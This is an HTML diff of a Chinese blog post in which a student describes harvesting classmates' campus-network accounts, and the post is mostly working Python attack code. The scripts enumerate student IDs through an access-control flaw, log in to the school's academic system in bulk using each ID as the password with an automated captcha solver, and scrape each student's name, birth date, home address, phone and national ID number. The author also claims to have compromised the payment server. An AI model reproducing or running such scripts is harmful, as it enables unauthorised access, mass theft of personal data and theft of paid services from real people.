@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="python,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/111.png?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="不管全世界所有人怎么说，我都认为自己的感受才是正确的。无论别人怎么看，我绝不打乱自己的节奏。                                  —–村上春树《挪威的森林》">
+<meta name="keywords" content="python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络账号获取与Selenium初探">
+<meta property="og:url" content="http://yoursite.com/2018/04/14/初探Selenium/index.html">
+<meta property="og:site_name" content="Yokeen&#39;s blog">
+<meta property="og:description" content="不管全世界所有人怎么说，我都认为自己的感受才是正确的。无论别人怎么看，我绝不打乱自己的节奏。                                  —–村上春树《挪威的森林》">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-18/8504381.jpg">
+<meta property="og:updated_time" content="2018-04-18T05:37:52.860Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网络账号获取与Selenium初探">
+<meta name="twitter:description" content="不管全世界所有人怎么说，我都认为自己的感受才是正确的。无论别人怎么看，我绝不打乱自己的节奏。                                  —–村上春树《挪威的森林》">
+<meta name="twitter:image" content="http://oxrfjovwk.bkt.clouddn.com/18-4-18/8504381.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: "",
+      labels: ""
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/04/14/初探Selenium/">
+
+
+
+
+
+  <title>网络账号获取与Selenium初探 | Yokeen's blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?12246f7e36b6d790ccbbfabf73da926b";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Yokeen's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/14/初探Selenium/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yokeen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/beiy.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yokeen's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">网络账号获取与Selenium初探</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-14T11:48:36+08:00">
+                2018-04-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/14/初探Selenium/" class="leancloud_visitors" data-flag-title="网络账号获取与Selenium初探">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<p>不管全世界所有人怎么说，我都认为自己的感受才是正确的。无论别人怎么看，我绝不打乱自己的节奏。<br>                                  —–村上春树《挪威的森林》</p>
+<hr>
+<a id="more"></a>
+<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><blockquote>
+<p>以前在实验室用网都是用wifi，自从换了个教室，wifi奇慢…</p>
+</blockquote>
+<p>如果要上校园网可以选择月供（40），学期供（200），自己手测了五六个同学的（学号 + 身份证后六位）…..也就将就着用了几个月。</p>
+<p><strong><font color="green">现在大三下了，手头倒是有一份大三学生的信息表，但是大三的同学的网基本都停了，还是得靠大一大二的学妹来支持学长啊，所以准备写脚本囤一波帐号艰难度过这最后两三个月。</font></strong></p>
+<blockquote>
+<p>问：你是学安全的为什么不撸站？<br>答：冲网费的服务器已经拿下了，但是站库分离。目标IP以及帐号密码是有，但是连不上，应该是做了些许防护。</p>
+</blockquote>
+<blockquote>
+<p>问：想办法啊！内网渗透、通过其他通信协议来传送流量，再不行，分析cookie组合方式，直接构造cookie批量登录抓取帐号密码啊（充值站某个页面返回json数据，利用console安装cookie后，可直接抓取）….<br>答：我就想写脚本练一练学习学习不行啊！</p>
+</blockquote>
+<p>有些事情以及其目的还是不要说太多的好…</p>
+<h1 id="分析与编写"><a href="#分析与编写" class="headerlink" title="分析与编写"></a>分析与编写</h1><p><strong>简单分析了一下校园网充值站点：</strong><br>1、密码错误3次以上会输入验证码<br>2、每次刷新页面源代码中会生成一个随机四位数字，并且在post的时候会带上。</p>
+<p><strong>先前写了几个demo绕第二个个步骤：</strong><br>1、利用cookielib请求第一次获取数字，请求第二次进行post发包，失败，会话不能维持。<br>2、请求第一次网站会有一个cookie，新开一个页面将原始cookie装上再次请求，不一样。<br>3、参数污染？没测…</p>
+<h2 id="具体编写流程分析"><a href="#具体编写流程分析" class="headerlink" title="具体编写流程分析"></a>具体编写流程分析</h2><p>1、教务系统存在一个小越权，某个url中直接输入学号会出现照片，由此判断学号是否存在，存储一波可用学号。<br>2、写脚本进行教务系统的登录（带验证码，没有接口可以爆破）。</p>
+<blockquote>
+<p>这里又有个小问题，chrome，firefox等浏览器打开后会提示不能创建对象，页面显示不完全。IE安装了校方提供的文件后可以展示完全。所以不能直接在主页面进行信息爬取。在IE中分析个人信息页面的url(每个人的还特么都不一样)爬取登录之后，抓取个人信息的url，进行个人信息的爬取。</p>
+</blockquote>
+<p>3、有了学号以及身份证号之后，进入充值站进行抓取得到最终信息（根据网费信息是正常还是停机来抓取可用帐号）</p>
+<h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1><h2 id="获取可用学号"><a href="#获取可用学号" class="headerlink" title="获取可用学号"></a>获取可用学号</h2><p><strong>第一代</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'account.txt'</span>,<span class="string">'a+'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">160000000000</span>,<span class="number">169999999999</span>):</span><br><span class="line">	url_info = <span class="string">'http://教务系统/upload/XXX/&#123;&#125;.jpg'</span>.format(i)</span><br><span class="line">	info = requests.get(url_info)</span><br><span class="line">	<span class="keyword">if</span> info.status_code == <span class="number">404</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">elif</span> info.status_code ==<span class="number">200</span>:</span><br><span class="line">		<span class="keyword">print</span> i</span><br><span class="line">		account_info = str(i) + <span class="string">'\n'</span></span><br><span class="line">		file.write(account_info)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>第二代</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'account.txt'</span>,<span class="string">'a+'</span>)</span><br><span class="line">channel_list = list(xrange(<span class="number">160000000000</span>,<span class="number">169009999999</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">(channel)</span>:</span></span><br><span class="line">	url_info = <span class="string">'http://教务系统/upload/XXX/&#123;&#125;.jpg'</span>.format(channel)</span><br><span class="line">	info = requests.get(url_info)</span><br><span class="line">	<span class="keyword">if</span> info.status_code == <span class="number">404</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Error...'</span> + str(channel)</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">elif</span> info.status_code ==<span class="number">200</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Success!!'</span> + str(channel)</span><br><span class="line">		account_info = str(channel) + <span class="string">'\n'</span></span><br><span class="line">		file.write(account_info)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	pool = Pool(processes=<span class="number">4</span>)</span><br><span class="line">	pool.map(spider,channel_list)</span><br></pre></td></tr></table></figure></p>
+<p>实验室网老断，丢到linux服务器跑吧。<br>nohup python -u spider_account_second.py &gt; demo.log 2&gt;&amp;1 &amp;</p>
+<h2 id="进行教务系统批量登录并获取其个人信息"><a href="#进行教务系统批量登录并获取其个人信息" class="headerlink" title="进行教务系统批量登录并获取其个人信息"></a>进行教务系统批量登录并获取其个人信息</h2><p><strong>用来获取信息的脚本</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib, urllib2</span><br><span class="line"><span class="keyword">import</span> cookielib</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#登录url，验证码url，验证码存储路径</span></span><br><span class="line">login_url = <span class="string">"http://教务系统/Login.aspx"</span></span><br><span class="line">captcha_url = <span class="string">"http://教务系统/other/CheckCode.aspx?datetime=az"</span></span><br><span class="line">captcha_path = <span class="string">'D:\\Script demo\\python_demo\\School\\optaion_account\\jiaowu_info\\photo\\'</span> <span class="comment">#图片存储路径</span></span><br><span class="line">early_url = <span class="string">'http://教务系统/JWXS/xsMenu.aspx'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过cookielib来创建opener对象，保存cookie</span></span><br><span class="line">cookie = cookielib.CookieJar()</span><br><span class="line">handler = urllib2.HTTPCookieProcessor(cookie)</span><br><span class="line">opener = urllib2.build_opener(handler)</span><br><span class="line">opener.addheaders=[(<span class="string">'User-agent'</span>,<span class="string">'Mozilla/5.0'</span>)]</span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用建立好的opener对象访问验证码地址，opener对象保存访问验证码后的cookie以及图片</span></span><br><span class="line">picture = opener.open(captcha_url).read()</span><br><span class="line">local = open(<span class="string">'D:\\Script demo\\python_demo\\School\\optaion_account\\jiaowu_info\\photo\\image.jpg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">local.write(picture)</span><br><span class="line">local.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用验证码识别工具自动输出验证码</span></span><br><span class="line">checkcode = os.popen(<span class="string">'verifyCaptchaconfig\\VerifyTool.exe verifyCaptchaconfig\\school.ci.png -f photo\\image.jpg'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> checkcode</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"post1"</span>:<span class="string">"post1_data"</span>,</span><br><span class="line">    <span class="string">"post2"</span>:<span class="string">"post1_data"</span>,</span><br><span class="line">    <span class="string">"post3"</span>:<span class="string">"post3_data"</span>,</span><br><span class="line">    <span class="string">"Account"</span>:<span class="string">"123456789"</span>,</span><br><span class="line">    <span class="string">"PWD"</span>:<span class="string">"123456789"</span>,</span><br><span class="line">    <span class="string">"CheckCode"</span>:checkcode,</span><br><span class="line">    <span class="string">"cmdok"</span>:<span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">post_data = urllib.urlencode(data)</span><br><span class="line"></span><br><span class="line">result = opener.open(login_url,post_data).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建获取信息的函数，这里边有两种情况</span></span><br><span class="line"><span class="comment"># 一、是否显示完全 有的浏览器可以显示所有页面，如IE，但是有的浏览器不可以，提示不能创建对象，这里使用源代码中的字符串来判断是否显示完全</span></span><br><span class="line"><span class="comment"># 二、是否登录成功  如果出现“other/CheckCode.aspx” 就说明没有登陆成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否登录成功，为-1则表示成功，否则则失败</span></span><br><span class="line">login_success_whether = result.find(<span class="string">'other/CheckCode.aspx'</span>)</span><br><span class="line"><span class="keyword">if</span> login_success_whether == <span class="number">-1</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Login Success!!"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Login Fail....."</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从登陆成功后的页面中找到个人资料的url</span></span><br><span class="line">info_url_early = opener.open(early_url).read()</span><br><span class="line">info_url_middle = re.findall(<span class="string">'xskp/jwxs_xskp_like\.aspx\?usermain=x\d&#123;10&#125;'</span>,info_url_early,re.S)[<span class="number">0</span>]</span><br><span class="line">info_url_after = <span class="string">'http://教务系统/JWXS/'</span> + info_url_middle</span><br><span class="line"><span class="comment"># 请求个人信息页面后抓取相关信息</span></span><br><span class="line">data_info = opener.open(info_url_after).read()</span><br><span class="line"></span><br><span class="line">Soup = BeautifulSoup(data_info,<span class="string">'lxml'</span>)</span><br><span class="line">institute = Soup.select(<span class="string">'#lbxsh'</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">major = Soup.select(<span class="string">'#lbzyh'</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">Class = Soup.select(<span class="string">'#lbbh'</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">name = Soup.select(<span class="string">'#tbxsxm'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">birth = Soup.select(<span class="string">'#tbcsrq'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">location = Soup.select(<span class="string">'#tbjtxzdz'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">home_tel = Soup.select(<span class="string">'#tblxdh'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">ID = Soup.select(<span class="string">'#tbsfzh'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line"><span class="keyword">print</span> institute,major,Class,name,birth,location,home_tel,ID</span><br></pre></td></tr></table></figure></p>
+<p><strong>稍微改善之后</strong><br>本来想再改一改用多进程或者多线程跑，先算了…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib, urllib2</span><br><span class="line"><span class="keyword">import</span> cookielib</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os, re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">student_info = open(<span class="string">'student_info.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Optain_info</span><span class="params">(account)</span>:</span></span><br><span class="line">	<span class="comment">#登录url，验证码url，验证码存储路径</span></span><br><span class="line">	login_url = <span class="string">"http://教务系统/Login.aspx"</span></span><br><span class="line">	captcha_url = <span class="string">"http://教务系统/other/CheckCode.aspx?datetime=az"</span></span><br><span class="line">	captcha_path = <span class="string">'D:\\Script demo\\python_demo\\School\\optaion_account\\jiaowu_info\\photo\\'</span></span><br><span class="line">	early_url = <span class="string">'http://教务系统/JWXS/xsMenu.aspx'</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># account = sys.argv[1]</span></span><br><span class="line">	<span class="comment"># 通过cookielib来创建opener对象，保存cookie</span></span><br><span class="line">	cookie = cookielib.CookieJar()</span><br><span class="line">	handler = urllib2.HTTPCookieProcessor(cookie)</span><br><span class="line">	opener = urllib2.build_opener(handler)</span><br><span class="line">	opener.addheaders=[(<span class="string">'User-agent'</span>,<span class="string">'Mozilla/5.0'</span>)]</span><br><span class="line">	urllib2.install_opener(opener)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#用建立好的opener对象访问验证码地址，opener对象保存访问验证码后的cookie以及图片</span></span><br><span class="line">	<span class="comment">#验证码有时候会显示错误，但是概率很小，5次重复足够了。</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">		picture = opener.open(captcha_url).read()</span><br><span class="line">		local = open(<span class="string">'D:\\Script demo\\python_demo\\School\\optaion_account\\jiaowu_info\\photo\\image.jpg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">		local.write(picture)</span><br><span class="line">		local.close()</span><br><span class="line">		<span class="comment">#利用验证码识别工具自动输出验证码</span></span><br><span class="line">		checkcode = os.popen(<span class="string">'verifyCaptchaconfig\\VerifyTool.exe verifyCaptchaconfig\\school.ci.png -f photo\\image.jpg'</span>).read()</span><br><span class="line">		<span class="keyword">if</span> len(checkcode) == <span class="number">4</span>:</span><br><span class="line">			<span class="keyword">print</span> checkcode</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	data = &#123;</span><br><span class="line">	    <span class="string">"post1"</span>:<span class="string">"post1_data"</span>,</span><br><span class="line">	    <span class="string">"post2"</span>:<span class="string">"post1_data"</span>,</span><br><span class="line">	    <span class="string">"post3"</span>:<span class="string">"post3_data"</span>,</span><br><span class="line">	    <span class="string">"Account"</span>:account,</span><br><span class="line">	    <span class="string">"PWD"</span>:account,</span><br><span class="line">	    <span class="string">"CheckCode"</span>:checkcode,</span><br><span class="line">	    <span class="string">"cmdok"</span>:<span class="string">""</span></span><br><span class="line">	&#125;</span><br><span class="line">	post_data = urllib.urlencode(data)</span><br><span class="line"></span><br><span class="line">	result = opener.open(login_url,post_data).read()</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 创建获取信息的函数</span></span><br><span class="line">	<span class="comment"># 这里边有两种情况</span></span><br><span class="line">	<span class="comment"># 一、是否显示完全 有的浏览器可以显示所有页面，如IE，但是有的浏览器只能显示部分页面，这里使用“xskp/jwxs_xskp_like.aspx?usermain=”判断是否显示完全</span></span><br><span class="line">	<span class="comment"># 二、是否登录成功  如果出现“other/CheckCode.aspx” 就说明没有登陆成功</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 是否登录成功，为-1则表示成功，否则则失败</span></span><br><span class="line">	login_success_whether = result.find(<span class="string">'other/CheckCode.aspx'</span>)</span><br><span class="line">	<span class="keyword">if</span> login_success_whether == <span class="number">-1</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Login success!!"</span> + account</span><br><span class="line">		info_url_early = opener.open(early_url).read()</span><br><span class="line">		info_url_middle = re.findall(<span class="string">'xskp/jwxs_xskp_like\.aspx\?usermain=x\d&#123;10&#125;'</span>,info_url_early,re.S)[<span class="number">0</span>]</span><br><span class="line">		info_url_after = <span class="string">'http://教务系统/JWXS/'</span> + info_url_middle</span><br><span class="line">		<span class="comment"># 获取到个人信息页面</span></span><br><span class="line">		data_info = opener.open(info_url_after).read()</span><br><span class="line"></span><br><span class="line">		Soup = BeautifulSoup(data_info,<span class="string">'lxml'</span>)</span><br><span class="line">		institute = Soup.select(<span class="string">'#lbxsh'</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">		major = Soup.select(<span class="string">'#lbzyh'</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">		Class = Soup.select(<span class="string">'#lbbh'</span>)[<span class="number">0</span>].get_text()</span><br><span class="line">		name = Soup.select(<span class="string">'#tbxsxm'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">		birth = Soup.select(<span class="string">'#tbcsrq'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">		location = Soup.select(<span class="string">'#tbjtxzdz'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">		home_tel = Soup.select(<span class="string">'#tblxdh'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">		ID = Soup.select(<span class="string">'#tbsfzh'</span>)[<span class="number">0</span>].get(<span class="string">'value'</span>)</span><br><span class="line">		response = <span class="string">u'&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;'</span>.format(account,institute,major,Class,name,birth,location,home_tel,ID)</span><br><span class="line">		detail =  response.encode(<span class="string">'gb18030'</span>)</span><br><span class="line">		<span class="keyword">print</span> detail</span><br><span class="line">		student_info.write(detail + <span class="string">'\n'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Login fail...."</span> + account</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = open(<span class="string">'demo.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">account = a.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> account:</span><br><span class="line">	i = i.strip(<span class="string">'\n'</span>)</span><br><span class="line">	Optain_info(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># account_info = num.split()</span></span><br><span class="line"><span class="comment"># for i in account_info:</span></span><br><span class="line"><span class="comment"># 	Optain_info(i)</span></span><br></pre></td></tr></table></figure></p>
